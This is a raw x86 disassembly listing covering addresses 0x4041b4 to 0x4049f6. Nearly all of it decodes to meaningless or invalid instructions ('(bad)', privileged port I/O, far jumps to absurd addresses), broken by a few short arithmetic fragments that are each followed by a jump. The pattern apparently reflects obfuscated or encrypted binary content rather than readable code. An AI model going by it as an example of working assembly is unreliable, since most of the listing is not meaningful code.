  4041b4:	cwde   
  4041b5:	sahf   
  4041b6:	sahf   
  4041b7:	jae    0x4041bc
  4041b9:	mov    eax,0xcd3eb51
  4041be:	jp     0x404232
  4041c0:	push   eax
  4041c1:	jnp    0x4041ad
  4041c3:	cmp    DWORD PTR [esi+0x2e54bd6e],ebp
  4041c9:	xlat   BYTE PTR ds:[ebx]
  4041ca:	test   eax,0x243494d3
  4041cf:	(bad)  
  4041d0:	leave  
  4041d1:	gs mov edi,0xaecba84
  4041d7:	sbb    edi,DWORD PTR ds:0x20310b83
  4041dd:	xchg   edi,eax
  4041de:	fisttp WORD PTR [edi-0x5c]
  4041e1:	jbe    0x4041b7
  4041e3:	inc    edx
  4041e4:	jmp    0xaf4b4120
  4041e9:	and    BYTE PTR [ebp+esi*4+0x199508f0],0x6f
  4041f1:	push   ecx
  4041f2:	jns    0x4041ee
  4041f4:	in     al,0x83
  4041f6:	push   edi
  4041f7:	dec    edx
  4041f8:	out    dx,eax
  4041f9:	xchg   esi,eax
  4041fa:	jle    0x404270
  4041fc:	jmp    0x50f5e1a1
  404201:	aas    
  404202:	repnz cmc 
  404204:	add    bl,dl
  404206:	test   DWORD PTR [edx],edx
  404208:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40420a:	push   edi
  40420b:	test   DWORD PTR [edi],esi
  40420d:	jecxz  0x40422f
  40420f:	lds    ebp,FWORD PTR [eax+0x37]
  404212:	xor    BYTE PTR [esi],cl
  404214:	ficom  DWORD PTR [ebx]
  404216:	push   0x24cb1b2a
  40421b:	fbstp  TBYTE PTR [edi-0x5b6e8e5b]
  404221:	dec    edx
  404222:	xor    eax,ecx
  404224:	add    eax,esi
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0x1473035
  404243:	outs   dx,DWORD PTR ds:[esi]
  404244:	xor    al,0x18
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x404238
  40424d:	repz add al,0x67
  404250:	nop
  404251:	das    
  404252:	stc    
  404253:	pushf  
  404254:	xor    ch,BYTE PTR [ebp+0x46e9312b]
  40425a:	and    BYTE PTR [edi],bh
  40425c:	lock push eax
  40425e:	push   esi
  40425f:	push   ds
  404260:	cmp    eax,0x7fb14824
  404265:	nop
  404266:	jmp    0x737e433e
  40426b:	and    al,BYTE PTR [edx+ebp*8+0x232c276a]
  404272:	xor    eax,DWORD PTR [ebx]
  404274:	fwait
  404275:	adc    ebx,DWORD PTR [ebp-0x5f849a5e]
  40427b:	push   esi
  40427c:	ret    0xb2d7
  40427f:	lds    eax,FWORD PTR [ebp+0x27a4bd2c]
  404285:	hlt    
  404286:	jns    0x404292
  404288:	in     al,0xba
  40428a:	into   
  40428b:	lock cld 
  40428d:	sbb    eax,0xc1e5fc4c
  404292:	int3   
  404293:	ins    DWORD PTR es:[edi],dx
  404294:	ds xor al,0x75
  404297:	dec    edi
  404298:	popf   
  404299:	cmp    bl,cl
  40429b:	push   eax
  40429c:	dec    ecx
  40429d:	in     eax,dx
  40429e:	jle    0x4042cd
  4042a0:	sbb    al,0xcf
  4042a2:	test   DWORD PTR [edi-0x29f8e034],edi
  4042a8:	in     eax,dx
  4042a9:	add    DWORD PTR [esi+esi*8],edi
  4042ac:	call   0xa9a9a3bf
  4042b1:	stc    
  4042b2:	push   edx
  4042b3:	jnp    0x404239
  4042b5:	dec    edx
  4042b6:	jae    0x40429c
  4042b8:	cdq    
  4042b9:	sar    DWORD PTR [esi],cl
  4042bb:	or     eax,0xf98f54b8
  4042c0:	jmp    0x404275
  4042c2:	add    dl,al
  4042c4:	fsub   DWORD PTR [esi-0x45abbda7]
  4042ca:	sbb    eax,0x105e68f0
  4042cf:	xor    BYTE PTR [edi-0x631efb23],cl
  4042d5:	mov    esi,0x4e765d16
  4042da:	rol    BYTE PTR [esi],0xe1
  4042dd:	and    ch,al
  4042df:	mov    cl,BYTE PTR [ebx+edx*4+0x57]
  4042e3:	mov    cl,0xfa
  4042e5:	test   al,0xb5
  4042e7:	sbb    ecx,DWORD PTR [eax+0xd]
  4042ea:	add    bl,BYTE PTR [eax-0x71]
  4042ed:	push   ss
  4042ee:	stos   DWORD PTR es:[edi],eax
  4042ef:	clc    
  4042f0:	jns    0x404297
  4042f2:	loop   0x404363
  4042f4:	push   ebx
  4042f5:	xor    esi,0x67
  4042f8:	jnp    0x404302
  4042fa:	call   0xa982:0xc93ba968
  404301:	ins    DWORD PTR es:[edi],dx
  404302:	cmp    al,0x36
  404304:	cmp    dl,BYTE PTR [edx+0x64c29179]
  40430a:	mov    cl,0x2
  40430c:	cs (bad) 
  40430e:	imul   edx,DWORD PTR gs:[ecx],0x7f07b9fe
  404315:	test   DWORD PTR [eax+ecx*2-0x35f9c1cc],esi
  40431c:	test   BYTE PTR ds:0x8e8578ef,dh
  404322:	or     edx,DWORD PTR [ebp+0x6]
  404325:	push   0xffffffe3
  404327:	cmovge ebp,ecx
  40432a:	cdq    
  40432b:	cmp    eax,0x2af06e5
  404330:	cs add eax,0x101f1cab
  404336:	and    eax,0xfe4e416f
  40433b:	rcr    eax,0x35
  40433e:	jne    0x40437c
  404340:	dec    esi
  404341:	dec    ecx
  404342:	add    eax,0x4457f35
  404347:	test   DWORD PTR [edx+esi*1],esp
  40434a:	out    0xf9,eax
  40434c:	bswap  esi
  40434e:	call   0xf354:0xb94264
  404355:	sbb    ebx,DWORD PTR ds:0x4af30c20
  40435b:	xor    esp,ebp
  40435d:	mov    BYTE PTR [esi],0x5d
  404360:	int3   
  404361:	mov    edi,0x9eb32cdf
  404366:	xor    ebp,esi
  404368:	in     eax,dx
  404369:	mov    cl,BYTE PTR ds:0x88af7439
  40436f:	stc    
  404370:	jl     0x404342
  404372:	and    ebp,DWORD PTR [edi-0x74f7ba77]
  404378:	inc    ebp
  404379:	or     BYTE PTR [edx-0x7557fabc],cl
  40437f:	push   ebp
  404380:	(bad)  
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	rcr    DWORD PTR ds:0xdc7895dd,cl
  4043a6:	daa    
  4043a7:	jo     0x404419
  4043a9:	sbb    BYTE PTR [edi+0x70],bh
  4043ac:	jo     0x4043af
  4043ae:	or     eax,0x9a79afe8
  4043b3:	push   0x16d6aa7a
  4043b8:	shl    DWORD PTR [esi-0xb6d196c],0x64
  4043bf:	sub    dl,BYTE PTR [edi+0x579d6215]
  4043c5:	add    eax,0x17ca2e57
  4043ca:	sbb    ecx,edi
  4043cc:	xor    eax,0xb718c6e1
  4043d1:	mov    cl,0x48
  4043d3:	scas   al,BYTE PTR es:[edi]
  4043d4:	or     DWORD PTR [edx+0x63211a6e],edx
  4043da:	iret   
  4043db:	std    
  4043dc:	std    
  4043dd:	outs   dx,DWORD PTR ds:[esi]
  4043de:	inc    ebp
  4043df:	ins    DWORD PTR es:[edi],dx
  4043e0:	test   BYTE PTR [ecx+0x1a2e57f8],0xf4
  4043e7:	lods   eax,DWORD PTR ds:[esi]
  4043e8:	adc    ebp,DWORD PTR [esi+0x58]
  4043eb:	aas    
  4043ec:	mov    DWORD PTR [edi+0x37],0x9a535cee
  4043f3:	dec    esi
  4043f4:	jge    0x404437
  4043f6:	ds ins DWORD PTR es:[edi],dx
  4043f8:	dec    edi
  4043f9:	(bad)  
  4043fa:	mov    ds:0x4c838f16,eax
  4043ff:	cmp    cl,bh
  404401:	call   0x88c6:0xadeb6e13
  404408:	pop    es
  404409:	aaa    
  40440a:	jg     0x40447a
  40440c:	fwait
  40440d:	push   edx
  40440e:	pop    ecx
  40440f:	mov    edi,edi
  404411:	sub    al,0x92
  404413:	shr    DWORD PTR [esi+0x55],1
  404416:	sub    BYTE PTR [ecx],ch
  404418:	rcl    BYTE PTR [esi-0x26],1
  40441b:	fiadd  WORD PTR [ebx]
  40441d:	jno    0x404445
  40441f:	imul   edi,DWORD PTR [esi],0x4c82de32
  404425:	add    eax,0x649fa608
  40442a:	pusha  
  40442b:	add    ch,ah
  40442d:	leave  
  40442e:	mov    ebx,0xb96794ff
  404433:	ror    BYTE PTR [ecx],cl
  404435:	cmp    eax,eax
  404437:	jo     0x404410
  404439:	ins    BYTE PTR es:[edi],dx
  40443a:	cdq    
  40443b:	jg     0x404448
  40443d:	mov    WORD PTR [edi-0x474747bc],es
  404443:	out    dx,al
  404444:	push   es
  404445:	jbe    0x404439
  404447:	inc    ebx
  404448:	cmp    DWORD PTR [ebx-0x58],0x2
  40444c:	dec    edx
  40444d:	gs jg  0x4044cd
  404450:	shl    eax,1
  404452:	adc    al,0x87
  404454:	push   esi
  404455:	xchg   esp,eax
  404456:	xor    eax,0xd2cce038
  40445b:	je     0x40441e
  40445d:	shr    DWORD PTR [edx+0x15],cl
  404460:	push   es
  404461:	lahf   
  404462:	xor    edi,ecx
  404464:	into   
  404465:	shl    bl,0xb1
  404468:	or     eax,0x1b790b38
  40446d:	and    ch,ah
  40446f:	lea    edx,[ebx+ebx*4+0x53]
  404473:	xor    eax,0xce691cfa
  404478:	xor    ecx,DWORD PTR [eax]
  40447a:	xor    ebp,DWORD PTR [eax-0x261d9275]
  404480:	iret   
  404481:	dec    eax
  404482:	outs   dx,BYTE PTR ds:[esi]
  404483:	retf   
  404484:	test   eax,0x63577fde
  404489:	mov    dl,0x31
  40448b:	retf   0x9681
  40448e:	and    dl,0x1b
  404491:	sbb    ecx,ecx
  404493:	ret    
  404494:	cmp    al,BYTE PTR [ecx-0x16]
  404497:	rol    BYTE PTR [ebx+0x7a6edc9f],0xee
  40449e:	jmp    0x4044fd
  4044a0:	push   edi
  4044a1:	dec    edi
  4044a2:	xchg   DWORD PTR [ebx+0x75],ecx
  4044a5:	inc    esp
  4044a6:	mov    edx,DWORD PTR [eax]
  4044a8:	inc    edx
  4044a9:	sbb    bh,BYTE PTR [edi+0x61]
  4044ac:	and    eax,0xce87a9be
  4044b1:	int3   
  4044b2:	nop
  4044b3:	jl     0x4044fc
  4044b5:	pop    edi
  4044b6:	add    DWORD PTR ds:0x59e8e281,0x9
  4044bd:	cmp    edi,esi
  4044bf:	mov    BYTE PTR [esi-0x6f02ab13],bl
  4044c5:	jne    0x40448c
  4044c7:	mov    al,0x72
  4044c9:	or     al,0x6c
  4044cb:	dec    ecx
  4044cc:	sbb    BYTE PTR [ebp+0x3cd0d950],0x57
  4044d3:	jl     0x40446d
  4044d5:	mov    edx,DWORD PTR [ebp+0xc]
  4044d8:	cmp    al,BYTE PTR [edx]
  4044da:	jne    0x404ccf
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x4044fc
  4044f5:	mov    eax,0x26847ba6
  4044fa:	jo     0x40456c
  4044fc:	sbb    BYTE PTR [edi+0x70],bh
  4044ff:	jo     0x40448a
  404501:	das    
  404502:	and    DWORD PTR [esi-0x24d55f3a],eax
  404508:	jmp    0x460923e4
  40450d:	xor    esi,edi
  40450f:	push   edi
  404510:	push   0x7994c2b
  404515:	ret    
  404516:	mov    DWORD PTR [esi+0x25fc0723],ecx
  40451c:	pop    ebx
  40451d:	adc    DWORD PTR [ecx],ebp
  40451f:	call   0x4480:0xe4e03702
  404526:	and    BYTE PTR [ebp-0x645c48c0],bh
  40452c:	jae    0x4044ba
  40452e:	xchg   BYTE PTR [esp+ebp*4+0xc],bh
  404532:	scas   eax,DWORD PTR es:[edi]
  404533:	dec    ecx
  404534:	mov    ds:0x49973f64,eax
  404539:	in     eax,0x6e
  40453b:	jb     0x4044e1
  40453d:	or     al,BYTE PTR [ecx]
  40453f:	fadd   st(3),st
  404541:	daa    
  404542:	fild   DWORD PTR [esi+0x2f]
  404545:	sti    
  404546:	mov    dh,0x93
  404548:	and    eax,0x57065ed0
  40454d:	loope  0x40450d
  40454f:	ret    
  404550:	cmp    DWORD PTR [ecx+0x4d511961],esp
  404556:	mov    bl,0x5e
  404558:	inc    ebp
  404559:	push   ss
  40455a:	add    al,0xc4
  40455c:	and    eax,0x846e07f1
  404561:	fiadd  WORD PTR [esi+0x62cc2523]
  404567:	push   cs
  404568:	je     0x404526
  40456a:	jb     0x404503
  40456c:	aad    0x1d
  40456e:	xchg   ebx,eax
  40456f:	mov    ch,0x67
  404571:	(bad)  
  404572:	(bad)  
  404574:	push   edi
  404575:	test   BYTE PTR [edi],cl
  404577:	imul   ecx,DWORD PTR [ecx-0x6c72ee2],0xffffff8c
  40457e:	sbb    ebx,DWORD PTR [ecx+eiz*2]
  404581:	test   eax,0xedcbfbdf
  404586:	mov    esp,0xda1e1ea2
  40458b:	pop    esi
  40458c:	jl     0x40457e
  40458e:	rol    DWORD PTR [ebx],0x46
  404591:	sub    cl,BYTE PTR [esi+0x28]
  404594:	pop    ecx
  404595:	lock loopne 0x4045cf
  404598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404599:	stos   BYTE PTR es:[edi],al
  40459a:	inc    edx
  40459b:	sub    al,0x5e
  40459d:	mov    ds:0xa21e4afa,eax
  4045a2:	aad    0x10
  4045a4:	adc    ecx,DWORD PTR [edi+ecx*1+0x25c7a04f]
  4045ab:	mov    edi,0x4e67d323
  4045b0:	icebp  
  4045b1:	pop    eax
  4045b2:	repz and eax,DWORD PTR [ebx-0x59]
  4045b6:	push   ebp
  4045b7:	je     0x404620
  4045b9:	mov    al,0xeb
  4045bb:	nop
  4045bc:	int3   
  4045bd:	mov    edi,0x8e710e8b
  4045c2:	scas   al,BYTE PTR es:[edi]
  4045c3:	jns    0x4045d9
  4045c5:	inc    edi
  4045c6:	cmp    ebp,DWORD PTR [ebp+ebp*1-0x53]
  4045ca:	inc    ebp
  4045cb:	addr16 out dx,al
  4045cd:	jae    0x40464b
  4045cf:	aaa    
  4045d0:	mov    bh,0x32
  4045d2:	dec    ebp
  4045d3:	jmp    0xa2f36d19
  4045d8:	mov    ch,0x95
  4045da:	ss enter 0x4e3c,0x6c
  4045df:	sahf   
  4045e0:	repz loop 0x40460b
  4045e3:	das    
  4045e4:	mov    cs:0x50bf268d,eax
  4045ea:	sub    BYTE PTR [ecx+esi*8],bl
  4045ed:	jl     0x404605
  4045ef:	ins    BYTE PTR es:[edi],dx
  4045f0:	stc    
  4045f1:	adc    BYTE PTR [ebp+0xf],al
  4045f4:	inc    esp
  4045f5:	sbb    ebp,esi
  4045f7:	inc    edx
  4045f8:	cmc    
  4045f9:	fcmovne st,st(2)
  4045fb:	lock push edx
  4045fd:	sub    dh,cl
  4045ff:	(bad)  
  404600:	into   
  404601:	pop    ecx
  404602:	xor    BYTE PTR [esi+0x6223e58b],al
  404608:	adc    ah,BYTE PTR [ecx+0x66]
  40460b:	add    al,BYTE PTR [edi]
  40460d:	shl    edi,1
  40460f:	lahf   
  404610:	mov    gs,WORD PTR [eax-0x55]
  404613:	es pop edi
  404615:	mov    dl,0xae
  404617:	adc    al,0xe5
  404619:	inc    ebx
  40461a:	push   edx
  40461b:	out    dx,eax
  40461c:	sti    
  40461d:	cdq    
  40461e:	pop    ebp
  40461f:	pushf  
  404620:	jp     0x4045b4
  404622:	dec    ebx
  404623:	idiv   DWORD PTR [edx-0x74f45e1c]
  404629:	push   ebp
  40462a:	or     al,0xf
  40462c:	mov    esi,0x3c13312
  404631:	(bad)  
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0xffc76c86
  404647:	inc    ecx
  404648:	dec    ebp
  404649:	lods   al,BYTE PTR ds:[esi]
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	sbb    edx,DWORD PTR [ebx]
  404653:	jmp    0xa0e50640
  404658:	(bad)  
  404659:	sbb    al,ch
  40465b:	ins    DWORD PTR es:[edi],dx
  40465c:	js     0x4046cd
  40465e:	sbb    al,0xc7
  404660:	iret   
  404661:	adc    al,0x3b
  404663:	jmp    FWORD PTR [ebp+edi*2-0x6d345184]
  40466a:	xchg   DWORD PTR [esi],edi
  40466c:	mov    BYTE PTR [esp+eax*8],cl
  40466f:	push   ebp
  404670:	or     eax,0xc9ce51ab
  404675:	sbb    dl,dl
  404677:	adc    eax,DWORD PTR [esi+0x4fd675af]
  40467d:	arpl   dx,bp
  40467f:	loop   0x4046f5
  404681:	inc    ecx
  404682:	dec    esp
  404683:	aaa    
  404684:	outs   dx,DWORD PTR ds:[esi]
  404685:	dec    ecx
  404686:	mov    dl,0xc4
  404688:	(bad)  
  40468a:	aas    
  40468b:	(bad)  
  40468c:	pop    ss
  40468d:	ja     0x4046d7
  40468f:	fiadd  DWORD PTR ds:0x77c15b7b
  404695:	mov    edi,0x924f1461
  40469a:	push   ds
  40469b:	ds sub cl,al
  40469e:	aam    0x9d
  4046a0:	jnp    0x404624
  4046a2:	inc    edx
  4046a3:	add    eax,0xab7894c1
  4046a8:	and    BYTE PTR [edx+0x5fa18179],bh
  4046ae:	in     eax,0xae
  4046b0:	hlt    
  4046b1:	pop    ebp
  4046b2:	cli    
  4046b3:	les    esp,FWORD PTR [edi+0x52b32e0c]
  4046b9:	jl     0x404692
  4046bb:	jns    0x404646
  4046bd:	leave  
  4046be:	jns    0x4046b4
  4046c0:	push   0xffffffea
  4046c2:	or     BYTE PTR [eax-0x17],ch
  4046c5:	jg     0x404705
  4046c7:	mov    ecx,DWORD PTR es:[ebx-0x30]
  4046cb:	pushf  
  4046cc:	lods   al,BYTE PTR ds:[esi]
  4046cd:	pop    esi
  4046ce:	jmp    0x4df9:0xd5d71051
  4046d5:	and    dh,ch
  4046d7:	lock imul edi,esi,0x2e
  4046db:	out    dx,eax
  4046dc:	and    esi,ecx
  4046de:	jb     0x4046de
  4046e0:	jge    0x404686
  4046e2:	lods   eax,DWORD PTR ds:[esi]
  4046e3:	sbb    BYTE PTR [esi+0x29],cl
  4046e6:	add    BYTE PTR [eax+0xadc3b3c],dh
  4046ec:	retf   
  4046ed:	ds pusha 
  4046ef:	sbb    ebp,DWORD PTR [edi+esi*4+0x14]
  4046f3:	shr    dh,1
  4046f5:	mov    eax,ds:0x5d35789c
  4046fa:	sbb    bl,BYTE PTR [esi]
  4046fc:	or     eax,0x1a26cf01
  404701:	sub    DWORD PTR [edx-0x7e],edx
  404704:	jp     0x40470c
  404706:	mov    ebx,0x724aac07
  40470b:	clc    
  40470c:	add    BYTE PTR [ecx-0x7bc6f61],bh
  404712:	ins    DWORD PTR es:[edi],dx
  404713:	inc    eax
  404714:	(bad)  [edx]
  404716:	adc    eax,0xc4d66900
  40471b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40471c:	imul   eax,DWORD PTR [edi],0xa10c4444
  404722:	das    
  404723:	dec    esi
  404724:	dec    esi
  404725:	jno    0x404754
  404727:	jmp    0x404743
  404729:	test   al,0xed
  40472b:	ins    DWORD PTR es:[edi],dx
  40472c:	lahf   
  40472d:	mov    bh,0x69
  40472f:	cmp    eax,0xb2b0c91e
  404734:	pop    esp
  404735:	add    esi,DWORD PTR [edx-0x534320d2]
  40473b:	and    eax,0xb961254d
  404740:	call   0x12a89a8b
  404745:	fsubr  st,st(0)
  404747:	test   DWORD PTR [eax-0x29],0x7416a292
  40474e:	repnz aaa 
  404750:	rol    eax,0x43
  404753:	push   edx
  404754:	mov    esi,DWORD PTR [ebp-0x46]
  404757:	out    dx,al
  404758:	scas   al,BYTE PTR es:[edi]
  404759:	scas   al,BYTE PTR es:[edi]
  40475a:	in     eax,0xaa
  40475c:	scas   eax,DWORD PTR es:[edi]
  40475d:	lock fdivp st(5),st
  404760:	jl     0x404750
  404762:	inc    eax
  404763:	sub    esi,ebp
  404765:	pop    ebp
  404766:	xchg   ebx,eax
  404767:	nop
  404768:	jg     0x404754
  40476a:	in     eax,dx
  40476b:	leave  
  40476c:	add    ecx,DWORD PTR [edi]
  40476e:	sub    BYTE PTR [edi+edx*8-0x5],0x43
  404773:	rcr    BYTE PTR [esi-0x2b445856],0xf
  40477a:	test   bh,bh
  40477c:	add    eax,DWORD PTR [eax]
  40477e:	add    bh,al
  404780:	inc    ebp
  404781:	call   0x7464515
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	and    al,cl
  404799:	or     DWORD PTR [eax],edi
  40479b:	push   esp
  40479c:	and    al,0x70
  40479e:	jo     0x4047b8
  4047a0:	jg     0x404812
  4047a2:	jo     0x404752
  4047a4:	std    
  4047a5:	retf   
  4047a6:	push   ecx
  4047a7:	mov    esp,0x6322072c
  4047ac:	sub    DWORD PTR [ecx],esp
  4047ae:	test   DWORD PTR [ecx+0x5c26e8a9],edi
  4047b4:	xor    al,0xe3
  4047b6:	mov    ch,0x78
  4047b8:	xchg   esi,eax
  4047b9:	cmp    esi,ecx
  4047bb:	mov    cl,0xca
  4047bd:	mov    ds:0xa3fc9d50,al
  4047c2:	mov    bh,BYTE PTR [esi+0x34238402]
  4047c8:	push   edi
  4047c9:	test   eax,0xd9e487f0
  4047ce:	es ss pop esp
  4047d1:	adc    DWORD PTR [ecx-0x278d8cb8],ecx
  4047d7:	xchg   ebp,eax
  4047d8:	in     al,0xd1
  4047da:	sub    al,0x7
  4047dc:	and    DWORD PTR [eax-0xf7b97f3],0xfffffffd
  4047e3:	pushf  
  4047e4:	and    eax,eax
  4047e6:	push   esi
  4047e7:	xchg   bh,dl
  4047e9:	fbstp  TBYTE PTR [ebx-0x32]
  4047ec:	cmp    ebx,DWORD PTR [ebx-0x29]
  4047ef:	lds    eax,FWORD PTR [edi+0x62]
  4047f2:	shl    DWORD PTR [eax],1
  4047f4:	pop    ebx
  4047f5:	cmp    dl,BYTE PTR [eax-0x23e88c22]
  4047fb:	sar    DWORD PTR [ebx-0x1ef74727],1
  404801:	pop    esi
  404802:	adc    ecx,DWORD PTR [ecx-0x5e85eafa]
  404808:	sub    eax,0xcf27a946
  40480d:	lock jge 0x40487c
  404810:	in     eax,dx
  404811:	sbb    DWORD PTR [ebp-0x27],esp
  404814:	push   es
  404815:	mov    edx,0xf422362d
  40481a:	jo     0x404820
  40481c:	call   0xe89a92f2
  404821:	jns    0x404820
  404823:	jmp    0xec94:0xdc001e23
  40482a:	ins    BYTE PTR es:[edi],dx
  40482b:	das    
  40482c:	sti    
  40482d:	pop    ss
  40482e:	jmp    0xe981b886
  404833:	mov    ds:0x1266b321,al
  404838:	xor    BYTE PTR [esi],0x2
  40483b:	test   ebp,0x87119a1f
  404841:	mov    al,0xab
  404843:	inc    edi
  404844:	bound  ecx,QWORD PTR [ebp+0x9]
  404847:	push   ss
  404848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404849:	mul    BYTE PTR [esi]
  40484b:	mov    edi,DWORD PTR [esp+ebp*8]
  40484e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40484f:	pop    edi
  404850:	lds    ecx,FWORD PTR [esi+0x64]
  404853:	test   BYTE PTR ds:0xc211d088,dh
  404859:	inc    edi
  40485a:	add    DWORD PTR es:[eax-0x4d],edi
  40485e:	out    0x4c,al
  404860:	xchg   ebp,eax
  404861:	mov    ah,0x24
  404863:	gs xchg esp,eax
  404865:	lds    edx,FWORD PTR ds:0xa10a08c3
  40486b:	sbb    eax,0x19c8f3f9
  404870:	shl    edi,0xe0
  404873:	shl    BYTE PTR ds:0xdf97db7b,0x73
  40487a:	test   BYTE PTR [ebp-0x1f],al
  40487d:	sbb    esi,ecx
  40487f:	aam    0x2a
  404881:	and    eax,0x389e7bf
  404886:	xlat   BYTE PTR ds:[ebx]
  404887:	push   es
  404888:	cmp    DWORD PTR [edi-0x6a44b9ad],ebp
  40488e:	pop    ebx
  40488f:	bound  esi,QWORD PTR [eax]
  404891:	int    0xcb
  404893:	push   ebx
  404894:	pop    edx
  404895:	ins    BYTE PTR es:[edi],dx
  404896:	in     al,dx
  404897:	lods   eax,DWORD PTR ds:[esi]
  404898:	nop
  404899:	(bad)
  40489c:	mov    edi,0xc34e1104
  4048a1:	sub    bh,ch
  4048a3:	repz xchg dh,ah
  4048a6:	(bad)  
  4048a7:	xor    al,0x35
  4048a9:	scas   eax,DWORD PTR es:[edi]
  4048aa:	mov    ch,BYTE PTR [eax-0x21]
  4048ad:	sbb    ah,ah
  4048af:	mov    al,ds:0xf3f61272
  4048b4:	daa    
  4048b5:	pop    eax
  4048b6:	aam    0x5
  4048b8:	add    eax,0x26ddb94b
  4048bd:	(bad)  
  4048be:	aam    0xb4
  4048c0:	lods   eax,DWORD PTR ds:[esi]
  4048c1:	pop    ss
  4048c2:	outs   dx,BYTE PTR ds:[esi]
  4048c3:	addr16 sahf 
  4048c5:	add    BYTE PTR [eax+esi*2-0x7218bf66],dl
  4048cc:	inc    ebp
  4048cd:	call   0x8c2c8e5b
  4048d2:	inc    ebp
  4048d3:	in     al,dx
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0x74519efb
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x4048f1
  40490a:	gs stos BYTE PTR es:[edi],al
  40490c:	pop    esp
  40490d:	push   ss
  40490e:	mov    DWORD PTR [eax],esi
  404910:	adc    BYTE PTR [ecx],bl
  404912:	xchg   ecx,eax
  404913:	and    DWORD PTR [edi],ebx
  404915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404916:	call   0xf548:0x5506e19c
  40491d:	pop    eax
  40491e:	lea    edi,[edx+0x480e73ab]
  404924:	call   0x9e95c2b5
  404929:	mov    esi,DWORD PTR [esi+0x10]
  40492c:	mov    dh,0xf7
  40492e:	sbb    BYTE PTR [edi],0xab
  404931:	in     eax,dx
  404932:	add    eax,0xccc97fe
  404937:	jmp    0x35c0:0x4983617f
  40493e:	fcmovnb st,st(3)
  404940:	in     al,0x3b
  404942:	xor    ebp,DWORD PTR [edx]
  404944:	pop    esi
  404945:	loope  0x404925
  404947:	jecxz  0x404994
  404949:	pusha  
  40494a:	ja     0x404944
  40494c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40494d:	adc    eax,0x685dc388
  404952:	hlt    
  404953:	lock mov edx,0xfbd824be
  404959:	add    DWORD PTR [ebp+0x22839fbe],ecx
  40495f:	or     BYTE PTR [ebp-0x2b452f4e],0x31
  404966:	inc    ebx
  404967:	jo     0x4049ab
  404969:	push   es
  40496a:	jmp    0xa9f0792
  40496f:	sbb    BYTE PTR [ebx+eax*1+0x6582640],bh
  404976:	(bad)  
  404977:	jmp    0x4049a1
  404979:	push   es
  40497a:	je     0xb2ea1ed5
  404980:	test   dl,0xaa
  404983:	sub    al,0xbf
  404985:	mov    ah,0xd4
  404987:	bswap  eax
  404989:	int    0xc0
  40498b:	adc    al,0x7a
  40498d:	mov    al,0x35
  40498f:	inc    ecx
  404990:	retf   0xf6b6
  404993:	pop    edi
  404994:	das    
  404995:	xor    ch,BYTE PTR [ebx]
  404997:	or     al,0x2c
  404999:	inc    esp
  40499a:	mov    ebp,0x4512698f
  40499f:	jo     0x4049ef
  4049a1:	mov    ebx,DWORD PTR [ecx-0x27]
  4049a4:	cwde   
  4049a5:	sbb    edi,DWORD PTR [ebx]
  4049a7:	inc    ebp
  4049a8:	mov    edi,0xb18c6857
  4049ad:	and    al,0xe9
  4049af:	sub    DWORD PTR [ecx-0x21],0xbb6ccf7a
  4049b6:	es cld 
  4049b8:	lods   eax,DWORD PTR ds:[esi]
  4049b9:	scas   al,BYTE PTR es:[edi]
  4049ba:	push   edx
  4049bb:	div    BYTE PTR [eax]
  4049bd:	in     eax,dx
  4049be:	sbb    edx,ebp
  4049c0:	retf   
  4049c1:	push   cs
  4049c2:	ficomp DWORD PTR [edi+0x6dbf5e4e]
  4049c8:	scas   al,BYTE PTR es:[edi]
  4049c9:	dec    ebp
  4049ca:	mov    ebp,0xccb753dd
  4049cf:	lea    ebx,[esi+eax*4-0x3ccd696c]
  4049d6:	imul   BYTE PTR [esi+0x6d]
  4049d9:	and    esp,eax
  4049db:	ds popaw 
  4049de:	mov    ebp,ss
  4049e0:	cli    
  4049e1:	je     0x404a01
  4049e3:	loope  0x404a23
  4049e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e6:	hlt    
  4049e7:	inc    BYTE PTR ds:0x1c2d7082
  4049ed:	nop
  4049ee:	dec    esp
  4049ef:	sahf   
  4049f0:	mov    WORD PTR [edx+0xf],gs
  4049f3:	xchg   DWORD PTR [eax+0x3c],ebp
  4049f6:	repnz es dec edi
